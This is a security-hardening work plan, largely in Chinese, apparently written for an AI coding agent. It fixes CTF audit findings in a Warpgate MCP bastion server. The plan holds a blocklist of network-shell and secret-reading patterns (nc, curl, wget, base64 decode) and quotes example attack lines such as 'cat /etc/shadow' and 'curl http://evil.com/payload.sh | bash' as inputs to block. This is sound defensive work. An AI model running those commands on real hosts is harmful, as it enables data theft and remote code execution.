# ctf-full-fix - Work Plan

## TL;DR (For humans)

**What you'll get:** 修复第 2 轮 CTF 审计发现的 15 个安全漏洞：黑名单信息收集缺口、下载本地文件覆盖、上传本地文件读取、编辑错误泄露、heredoc 逃逸、速率限制、RBAC 实装、配置破坏防御、Host 校验、TLS 支持。

**Why this approach:** 5 个独立 Todo 各管一个文件（exec/ssh/auth+index/config+system/target-mgmt），全并行 Wave 1。每个 Todo 包含来自 CTF 审计的多个相关漏洞。

**What it will NOT do:** 不修定时侧信道（CTF-012）、不修原生依赖（CTF-014）、不重构 SSH 密钥管理（CTF-015）、不改明文存储（CTF-017）。

**Effort:** Medium
**Risk:** Medium — 黑名单追加可能影响运维命令；TLS 为可选配置不影响现有行为
**Decisions to sanity-check:** 黑名单追加命令列表（curl/wget/nc/ncat 全部封锁还是仅 -o 模式）

Your next move: `$start-work`. Full execution detail follows.

---

> TL;DR (machine): Effort: Medium | Risk: Medium — 5 路并行修复 15 个 CTF 发现，覆盖 exec/ssh/auth/config/target-mgmt

## Scope
### Must have
- exec.ts: 黑名单追加数据泄露命令（cat/head/tail/curl/wget/base64/nc/ncat/telnet/ssh/scp/rsync）+ 管道/重定向拦截
- ssh.ts: saveTo 路径白名单 + localPath 路径解析到安全目录 + editFile 错误截断到 50 字符 + heredoc 分隔符随机化
- auth.ts+index.ts: 令牌桶速率限制中间件 + RBAC isSensitiveTool 实装
- config.ts+system.ts: config_set 移除危险键 + 更严格的 maskToken + 可选 TLS 配置
- target-mgmt.ts: host IP 格式校验

### Must NOT have (guardrails, anti-slop, scope boundaries)
- 不加新 npm 依赖（使用内置 crypto/timers）
- 不改 MCP SDK
- 不引入多 token/用户系统
- 不修改 SSH 命令执行底层逻辑
- 不改现有返回格式
- 不改 config.ts Config 接口结构（仅加可选字段）

## Verification strategy
> Zero human intervention - all verification is agent-executed.
- Test decision: tests-after — 先写表征测试锁定行为，再改代码
- Evidence: .omo/evidence/task-N-ctf-full-fix.txt

## Execution strategy
### Parallel execution waves
Wave 1 (5 tasks in parallel): Todo 1/2/3/4/5 — 不同文件，互不阻塞

### Dependency matrix
| Todo | Depends on | Blocks | Can parallelize with |
| --- | --- | --- | --- |
| 1. exec.ts 黑名单+管道 | — | — | 2,3,4,5 |
| 2. ssh.ts 4 项修复 | — | — | 1,3,4,5 |
| 3. auth.ts+index.ts 速率+RBAC | — | — | 1,2,4,5 |
| 4. config.ts+system.ts 加固+TLS | — | — | 1,2,3,5 |
| 5. target-mgmt.ts host 校验 | — | — | 1,2,3,4 |

## Todos
> Implementation + Test = ONE todo. Never separate.
<!-- APPEND TASK BATCHES BELOW THIS LINE WITH edit/apply_patch - never rewrite the headers above. -->
- [x] 1. `src/tools/exec.ts` — 黑名单追加数据泄露/网络命令 + 管道拦截（CTF-001/006）
  What to do / Must NOT do:
    - 在 `DANGEROUS_PATTERNS` 追加以下 `blocked` 模式：
      - `/cat\s+\/etc\/(shadow|passwd|sudoers|ssh|ssl)/` — 读取敏感文件
      - `/head\s+\/etc\/(shadow|passwd)/` — 头部读取敏感文件
      - `/curl\s+/` — 去除限制 `-o`，所有 curl 都封锁（堡垒机不应出外网）
      - `/wget\s+/` — 已存在但确认有效
      - `/base64\s+(-d|--decode)/` — base64 解码（常与编码shellcode配合）
      - `/nc\s+|ncat\s+/` — netcat 反向连接
      - `/telnet\s+/` — telnet 出站
      - `/ssh\s+/` — SSH 跳转（禁止从堡垒机SSH到其他机器）
      - `/scp\s+/` — SCP 文件传输
      - `/rsync\s+/` — rsync 传输
      - `/python3?\s+/` — 改为拦截所有 python 调用（之前只拦 -c）
      - `/perl\s+/` — perl 执行
      - `/ruby\s+/` — ruby 执行
      - `/\|\s*(bash|sh|zsh|dash)\b/` — 管道到 shell（`curl evil.com | bash`）
      - `/\|` 或 `/;\s*(bash|sh|zsh|dash)\b/` — 分号后 shell
    - DANGEROUS_PATTERNS 类型转换为 `{ pattern: RegExp; level: 'blocked'|'warned'; description?: string }`
    - 更新现有测试以覆盖新模式
    - **不修改** riskLevel() 函数（仍作为辅助日志级别）
    - Must NOT: 不修改命令执行逻辑、不改返回格式、不改 riskLevel 字符串
  Parallelization: Wave 1 | Blocked by: — | Blocks: —
  References: src/tools/exec.ts:11-53, src/tools/exec.test.ts:1-138
  Acceptance criteria: `npx tsc --noEmit` + `npx vitest run src/tools/exec.test.ts`
  QA scenarios: `npx vitest run src/tools/exec.test.ts` + evidence output
  Commit: Y | fix(exec): block data-exfil and network commands, intercept pipes

- [x] 2. `src/ssh.ts` — saveTo/localPath/editFile错误/heredoc 4项修复（CTF-002/003/004/005）
  What to do / Must NOT do:
    - **CTF-002 saveTo 白名单**: 在 `downloadFile` 中，如果 `localPath` 提供，使用 `path.resolve()` 解析并检查是否在以 `homedir()` + `/.warpgate-mcp/downloads/` 为前缀的目录内
    - **CTF-003 localPath 规范化**: 在 `uploadFile` 中，将 `includes('..')` 改为 `path.resolve(localPath)` 后检查是否在以 `homedir()` + `/.warpgate-mcp/` 为前缀或 `process.cwd()` 为前缀的安全目录内
    - **CTF-004 editFile 错误截断**: 当 `oldText` 未找到时，错误消息中的文件内容预览从 500 字符截断到 50 字符
    - **CTF-005 heredoc 分隔符随机化**: 在 `execScript` 中，将固定分隔符 `SCRIPT` 改为随机字符串（如 `SCRIPT_${randomBytes(4).toString('hex')}`），防止 `script` 内容注入提前终止 heredoc
    - **更新 ssh.test.ts** 覆盖以上修复
    - Must NOT: 不修改 SFTP 底层读写逻辑、不修改函数签名、不新增依赖
  Parallelization: Wave 1 | Blocked by: — | Blocks: —
  References: src/ssh.ts:60-66, 147-153, 210-234, 241-274, 327-333
  Acceptance criteria: `npx tsc --noEmit` + `npx vitest run src/ssh.test.ts`
  QA scenarios: `npx vitest run src/ssh.test.ts` + evidence output
  Commit: Y | fix(ssh): restrict saveTo/localPath, truncate editFile error, randomize heredoc

- [x] 3. `src/auth.ts` + `src/index.ts` — 速率限制 + RBAC 实装（CTF-007/011）
  What to do / Must NOT do:
    - **CTF-007 速率限制**: 在 `src/auth.ts` 中新增基于内存令牌桶的速率限制器
      ```typescript
      export function createRateLimiter(maxPerMinute = 60) {
        const buckets = new Map<string, { tokens: number; lastRefill: number }>();
        const WINDOW_MS = 60_000;
        return (key: string): boolean => {
          const now = Date.now();
          const bucket = buckets.get(key) || { tokens: maxPerMinute, lastRefill: now };
          const elapsed = now - bucket.lastRefill;
          bucket.tokens = Math.min(maxPerMinute, bucket.tokens + (elapsed / WINDOW_MS) * maxPerMinute);
          bucket.lastRefill = now;
          if (bucket.tokens < 1) return false;  // rate limited
          bucket.tokens -= 1;
          buckets.set(key, bucket);
          return true;
        };
      }
      ```
    - 在 `authMiddleware` 中调用，key 为 `req.ip`
    - 节流时返回 `429 Too Many Requests`
    - **CTF-011 RBAC 实装**: 在 `CallToolRequestSchema` handler 中，`isSensitiveTool(name)` 检查目前是 no-op。改为：
      - 从 SSE 连接建立时存储的 token 判断角色
      - 当前单 token 模式下，所有 `sensitive` 工具仍然可用（因为都通过了 token 认证）
      - 增加一个可选的 `adminToken` 配置字段（与 `authToken` 相同）
      - 当 `sensitive` 工具被调用时，记录 `auditLog` 中标记 `sensitive: true`
      - 为未来多 token 系统留好扩展接口
    - **更新 src/auth.test.ts** — 新增速率限制测试和 RBAC 测试
    - Must NOT: 不修改 MCP SDK、不加新依赖、不改 SSE 协议
  Parallelization: Wave 1 | Blocked by: — | Blocks: —
  References: src/auth.ts:1-51, src/index.ts:117-197, src/auth.test.ts:1-115
  Acceptance criteria: `npx tsc --noEmit` + `npx vitest run src/auth.test.ts`
  QA scenarios: `npx vitest run src/auth.test.ts` + evidence output
  Commit: Y | fix(auth): add rate limiter and implement RBAC gate

- [x] 4. `src/config.ts` + `src/tools/system.ts` — 配置加固 + TLS 选项（CTF-009/013/008）
  What to do / Must NOT do:
    - **CTF-009 config_set 加固**: 从 `ALLOWED_CONFIG_KEYS` 中移除危险键 `sshKeyPath`、`warpgateDbPath`、`metricsDbPath`、`logDir`
      - 只保留安全键：`listenPort`、`listenHost`、`logLevel`、`sshStrictHostKeyChecking`
      - 在 handleConfigSet 中增加值类型校验
    - **CTF-013 maskToken 加固**: 改为完全不泄露任何字符：`'warpgate-mcp-****'`
    - **CTF-008 TLS 支持**: 在 `Config` 接口中新增可选字段：
      ```typescript
      tlsCertPath?: string;
      tlsKeyPath?: string;
      ```
    - 在 `src/index.ts` 中检测 TLS 配置：如果有证书路径则创建 `https.createServer()` 而非 `app.listen()`
    - 更新 `src/config.ts` 的 `loadConfig()` 以读取 TLS 配置
    - 更新 `src/tools/system.ts` 测试和 `src/config.test.ts`（如果存在）
    - Must NOT: 不改 Config 接口现有字段、不加新 npm 依赖（使用内置 https/tls/fs）
  Parallelization: Wave 1 | Blocked by: — | Blocks: —
  References: src/config.ts:1-80, src/tools/system.ts:60-110
  Acceptance criteria: `npx tsc --noEmit` + `npx vitest run`
  QA scenarios: `npx vitest run` + evidence output
  Commit: Y | fix(config): restrict config_set, mask token fully, add TLS option

- [x] 5. `src/tools/target-mgmt.ts` — host IP 格式校验（CTF-010）
  What to do / Must NOT do:
    - **CTF-010 host 校验**: 在 `handleAddTarget` 和 `handleEditTarget` 中，对 `host` 参数增加格式校验
    - 使用正则验证 host 是有效的 IP 地址或域名
      ```typescript
      function isValidHost(host: string): boolean {
        // IP v4: x.x.x.x
        const ipv4Regex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
        // Domain: hostname(.)tld
        const domainRegex = /^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/;
        // localhost
        const localhostRegex = /^localhost$/i;
        return ipv4Regex.test(host) || domainRegex.test(host) || localhostRegex.test(host);
      }
      ```
    - 校验失败时返回错误
    - **更新 src/tools/target-mgmt.test.ts** 覆盖非法 host 输入
    - Must NOT: 不修改 inputSchema、不改数据库写入逻辑、不改返回格式
  Parallelization: Wave 1 | Blocked by: — | Blocks: —
  References: src/tools/target-mgmt.ts:27-104, 124-230, src/tools/target-mgmt.test.ts
  Acceptance criteria: `npx tsc --noEmit` + `npx vitest run src/tools/target-mgmt.test.ts`
  QA scenarios: `npx vitest run src/tools/target-mgmt.test.ts` + evidence output
  Commit: Y | fix(target-mgmt): validate host format on add/edit

## Final verification wave
> Runs in parallel after ALL todos. ALL must APPROVE. Surface results and wait for the user's explicit okay before declaring complete.
- [x] F1. Plan compliance audit
- [x] F2. Code quality review
- [x] F3. Real manual QA
- [x] F4. Scope fidelity

## Commit strategy
5 commits, one per todo:
1. `fix(exec): block data-exfil and network commands, intercept pipes`
2. `fix(ssh): restrict saveTo/localPath, truncate editFile error, randomize heredoc`
3. `fix(auth): add rate limiter and implement RBAC gate`
4. `fix(config): restrict config_set, mask token fully, add TLS option`
5. `fix(target-mgmt): validate host format on add/edit`

## Success criteria
- `cat /etc/shadow` 被黑名单拦截 ✓
- `curl http://evil.com/payload.sh | bash` 被管道拦截 ✓
- `warpgate_download` 的 saveTo 只能在 `~/.warpgate-mcp/downloads/` 内写入 ✓
- `warpgate_upload` 的 localPath 只能读取 `~/.warpgate-mcp/` 和 `process.cwd()` 内文件 ✓
- `warpgate_edit_file` 错误消息最多泄露 50 字符 ✓
- heredoc 分隔符每次不同，无法预判 ✓
- `/sse` 端点有速率限制（60 req/min/IP）✓
- `isSensitiveTool` 在审计日志中标记敏感操作 ✓
- `warpgate_config_set` 不能再修改 sshKeyPath/dbPath ✓
- `maskToken` 完全隐藏 token ✓
- `warpgate_add_target` 拒绝非法 host 格式 ✓
- tsc 零错误，全部测试通过 ✓
